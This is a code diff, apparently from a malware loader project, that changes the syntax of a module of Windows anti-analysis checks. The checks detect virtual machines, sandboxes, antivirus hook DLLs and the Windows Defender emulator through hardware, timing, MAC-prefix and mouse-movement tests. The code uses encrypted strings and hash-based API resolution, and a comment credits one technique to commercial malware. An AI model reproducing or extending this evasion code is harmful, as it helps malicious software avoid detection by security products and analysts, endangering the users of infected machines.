@@ -45,19 +45,19 @@ typedef NTSTATUS(NTAPI* pNtDelayExecution)(
 /*
 通过SystemBasicInformation检测CPU核心数
 */
-BOOLEAN checkCPUCoreNum() {
+auto checkCPUCoreNum() -> BOOLEAN {
     return GetCpuCoreNum() < 4;
 }
 /*
 通过 SystemMemoryUsageInformation 检测物理内存大小 (以 GB 为单位)
 */
-BOOLEAN checkPhysicalMemory() {
+auto checkPhysicalMemory() -> BOOLEAN {
     return (GetPhysicalMemory() / (1024*1024*1024)) < 4;
 }
 /*
 通过 DeviceIoControl 获取系统总磁盘大小 需要管理员权限
 */
-BOOLEAN checkTotalDiskSize()
+auto checkTotalDiskSize() -> BOOLEAN
 {
     INT disk = 256 * 0.9;
     HANDLE hDrive;
@@ -76,22 +76,22 @@ BOOLEAN checkTotalDiskSize()
 }
 
 // 检测系统启动时间是否小于30分钟
-BOOLEAN checkBootTime(){
+auto checkBootTime() -> BOOLEAN {
     return GetBootTime() < 30;
 }
 
-BOOLEAN checkHyperVPresent() {
+auto checkHyperVPresent() -> BOOLEAN {
     int cpuInfo[4];
     __cpuid(cpuInfo, 0x1);  // 获取 CPUID 信息，0x1 表示获取 CPU 信息
     return (cpuInfo[2] & (1 << 31)) != 0;  // 检查 HYPERV_HYPERVISOR_PRESENT_BIT（第31位）
 }
 
-BOOLEAN checkTempFileCount(INT reqFileCount){
+auto checkTempFileCount(INT reqFileCount) -> BOOLEAN {
     return getTempFileCount() < reqFileCount;
 }
 
 
-BOOLEAN checkGPUMemory() {
+auto checkGPUMemory() -> BOOLEAN {
     BOOLEAN lowMemoryGPU = TRUE;
 
     // 如果显卡显存大于0.5GB，则认为该显卡不是低显存
@@ -102,7 +102,7 @@ BOOLEAN checkGPUMemory() {
     return lowMemoryGPU;
 }
 
-BOOLEAN checkMacAddrPrefix() {
+auto checkMacAddrPrefix() -> BOOLEAN {
 
     const std::vector<std::string>& macPrefixes = { ENCRYPT_STR("08-00-27"), ENCRYPT_STR("00-03-FF"), ENCRYPT_STR("00-05-69"), ENCRYPT_STR("00-0C-29"), ENCRYPT_STR("00-50-56") };
     PIP_ADAPTER_INFO pIpAdapterInfo = nullptr;
@@ -159,7 +159,7 @@ BOOLEAN checkMacAddrPrefix() {
     return foundMatchingPrefix;
 }
 
-BOOLEAN caseInsensitiveCompare(const std::string& str1, const std::string& str2) {
+auto caseInsensitiveCompare(const std::string& str1, const std::string& str2) -> BOOLEAN {
     if (str1.size() != str2.size()) return false;
 
     return std::equal(str1.begin(), str1.end(), str2.begin(),
@@ -170,7 +170,7 @@ BOOLEAN caseInsensitiveCompare(const std::string& str1, const std::string& str2)
 
 
 
-BOOLEAN checkCurrentProcessFileName(const std::wstring& targetSubstring) {
+auto checkCurrentProcessFileName(const std::wstring& targetSubstring) -> BOOLEAN {
     wchar_t path[MAX_PATH];
     // 获取当前进程的可执行文件路径
     DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);
@@ -190,7 +190,7 @@ BOOLEAN checkCurrentProcessFileName(const std::wstring& targetSubstring) {
     return executablePath.find(targetSubstring) == std::wstring::npos;
 }
 
-BOOLEAN check_run_path() {
+auto check_run_path() -> BOOLEAN {
     // 获取当前工作目录
     char buf[256];
     GetCurrentDirectoryA(256, buf);
@@ -223,7 +223,7 @@ BOOLEAN check_run_path() {
     return FALSE;
 }
 
-BOOLEAN checkdlls() {
+auto checkdlls() -> BOOLEAN {
     // 黑名单 DLL 列表
     std::vector<std::wstring> dlls = {
         ENCRYPT_WSTR("avghookx.dll"),    // AVG
@@ -249,7 +249,7 @@ BOOLEAN checkdlls() {
     return FALSE;
 }
 
-BOOLEAN mouse_movement() {
+auto mouse_movement() -> BOOLEAN {
 
     POINT positionA = {};
     POINT positionB = {};
@@ -271,10 +271,9 @@ BOOLEAN mouse_movement() {
         return FALSE;
 }
 
-BOOLEAN accelerated_sleep()
-{
-    DWORD dwStart = 0, dwEnd = 0, dwDiff = 0;
-    DWORD dwMillisecondsToSleep = 60 * 1000;
+auto accelerated_sleep() -> BOOLEAN {
+    ULONG64 dwStart = 0, dwEnd = 0, dwDiff = 0;
+    ULONG64 dwMillisecondsToSleep = 60 * 1000;
 
     /* Retrieves the number of milliseconds that have elapsed since the system was started */
     dwStart = AR_getTickcount64();
@@ -359,8 +358,7 @@ BOOLEAN accelerated_sleep()
 //    return response;
 //}
 
-BOOLEAN query_license_value()
-{
+auto query_license_value() -> BOOLEAN {
 
 
     UNICODE_STRING LicenseValue;
@@ -383,8 +381,7 @@ BOOLEAN query_license_value()
 }
 
 #define LODWORD(_qw)    ((DWORD)(_qw))
-BOOLEAN rdtsc_diff_locky()
-{
+auto rdtsc_diff_locky() -> BOOLEAN {
     ULONGLONG tsc1;
     ULONGLONG tsc2;
     ULONGLONG tsc3;
@@ -416,7 +413,7 @@ BOOLEAN rdtsc_diff_locky()
 }
 
 // sleep
-void GetSystemTimeAdjustmentWithDelay() {
+auto GetSystemTimeAdjustmentWithDelay() -> void {
     DWORD timeAdjustment = 0;
     DWORD timeIncrement = 0;
     BOOL timeAdjustmentDisabled = FALSE;
@@ -430,8 +427,7 @@ void GetSystemTimeAdjustmentWithDelay() {
 
 
 /*WaitForSingleObject*/
-BOOLEAN timing_WaitForSingleObject(UINT delayInMillis)
-{
+auto timing_WaitForSingleObject(UINT delayInMillis) -> BOOLEAN {
     HANDLE hEvent;
 
     // Create a nonsignaled event
@@ -450,13 +446,11 @@ BOOLEAN timing_WaitForSingleObject(UINT delayInMillis)
 }
 
 /*setTimer*/
-BOOLEAN CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
-{
+auto TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) -> BOOLEAN {
     // This function is called when the timer expires
     return TRUE;
 }
-BOOLEAN timing_SetTimer(UINT delayInMillis)
-{
+auto timing_SetTimer(UINT delayInMillis) -> BOOLEAN {
     // Set a timer that triggers after `delayInMillis` milliseconds
     UINT_PTR timerId = SetTimer(NULL, 0, delayInMillis, (TIMERPROC)TimerProc);
 
@@ -500,7 +494,7 @@ typedef struct _RawSMBIOSData {
     DWORD Length;
     BYTE SMBIOSTableData[];
 } RawSMBIOSData;
-const char* dmi_string(const dmi_header* dm, BYTE s) {
+auto dmi_string(const dmi_header* dm, BYTE s) -> const char* {
     const char* bp = (const char*)dm + dm->length;
 
     if (s == 0) return ENCRYPT_STR("Not Specified");
@@ -510,7 +504,7 @@ const char* dmi_string(const dmi_header* dm, BYTE s) {
     }
     return *bp ? bp : ENCRYPT_STR("BAD_INDEX");
 }
-void dmi_system_uuid(const BYTE* p, short ver) {
+auto dmi_system_uuid(const BYTE* p, short ver) -> void {
     bool only0xFF = true, only0x00 = true;
 
     for (int i = 0; i < 16 && (only0x00 || only0xFF); i++) {
@@ -554,23 +548,7 @@ DWORD wdxEmulatorAPIHashTable[] = {
     0x7A99CFAE
 };
 
-PVOID wdxGetProcedureAddressByHash(
-    _In_ PVOID MpClientBase,
-    _In_ DWORD ProcedureHash);
-
-
-/*
-* wdxGetHashForString
-*
-* Purpose:
-*
-* Calculates specific hash for string.
-*
-*/
-DWORD wdxGetHashForString(
-    _In_ char* s
-)
-{
+auto wdxGetHashForString(_In_ char* s) -> DWORD {
     DWORD h = 0;
 
     while (*s != 0) {
@@ -582,19 +560,7 @@ DWORD wdxGetHashForString(
     return h;
 }
 
-/*
-* wdxGetProcedureAddressByHash
-*
-* Purpose:
-*
-* Return pointer to function in MpClient from name hash value.
-*
-*/
-PVOID wdxGetProcedureAddressByHash(
-    _In_ PVOID ImageBase,
-    _In_ DWORD ProcedureHash
-)
-{
+auto wdxGetProcedureAddressByHash(_In_ PVOID ImageBase, _In_ DWORD ProcedureHash) -> PVOID {
     DWORD i;
     ULONG sz = 0;
 
@@ -644,8 +610,7 @@ PVOID wdxGetProcedureAddressByHash(
 * This method implemented in commercial malware presumable since 2013.
 *
 */
-VOID wdCheckEmulatedVFS(VOID)
-{
+auto wdCheckEmulatedVFS(VOID) -> VOID {
     WCHAR szBuffer[MAX_PATH];
     WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };
 
@@ -664,9 +629,7 @@ VOID wdCheckEmulatedVFS(VOID)
 * Detect MS emulator state.
 *
 */
-NTSTATUS wdIsEmulatorPresent(
-    VOID)
-{
+auto wdIsEmulatorPresent(VOID) -> NTSTATUS {
     PCHAR ImageBase = NULL;
 
     IMAGE_DOS_HEADER* DosHeader;
@@ -724,7 +687,7 @@ NTSTATUS wdIsEmulatorPresent(
 * predefined values.
 *
 */
-BOOLEAN wdIsEmulatorPresent2(VOID){
+auto wdIsEmulatorPresent2(VOID) -> BOOLEAN {
     
     return dynamicInvoker.Invoke<NTSTATUS>(NtIsProcessInJobStruct.funcAddr, NtIsProcessInJobStruct.funcHash,
         (HANDLE)-1, UlongToHandle(10)) == 0x125;
@@ -738,7 +701,7 @@ BOOLEAN wdIsEmulatorPresent2(VOID){
 * Same as previous.
 *
 */
-BOOLEAN wdIsEmulatorPresent3(VOID){
+auto wdIsEmulatorPresent3(VOID) -> BOOLEAN {
     
     if (NT_SUCCESS(dynamicInvoker.Invoke<NTSTATUS>(NtCompressKeyStruct.funcAddr, NtCompressKeyStruct.funcHash, UlongToHandle(0xFFFF1234))))
         return TRUE;
@@ -748,7 +711,7 @@ BOOLEAN wdIsEmulatorPresent3(VOID){
 
 #pragma warning(pop)
 
-BOOLEAN checkDllGetClassObject() {
+auto checkDllGetClassObject() -> BOOLEAN {
     pDllGetClassObject DllGetClassObject = (pDllGetClassObject)GetProcAddressbyHASH(myLoadLibrary(ENCRYPT_WSTR("pid.dll")), DllGetClassObject_Hashed);
     GUID sid = { 0 };
     GUID iid = { 0 };
@@ -757,11 +720,11 @@ BOOLEAN checkDllGetClassObject() {
     
     return(hr != CLASS_E_CLASSNOTAVAILABLE);
 }
-BOOLEAN checkSxInDll() {
+auto checkSxInDll() -> BOOLEAN {
     if (myLoadLibrary(ENCRYPT_WSTR("SxIn.dll"))) return TRUE;
     return FALSE;
 }
-BOOLEAN checkProcessVX_QQ() {
+auto checkProcessVX_QQ() -> BOOLEAN {
     ULONG retLen = 0;
 
     
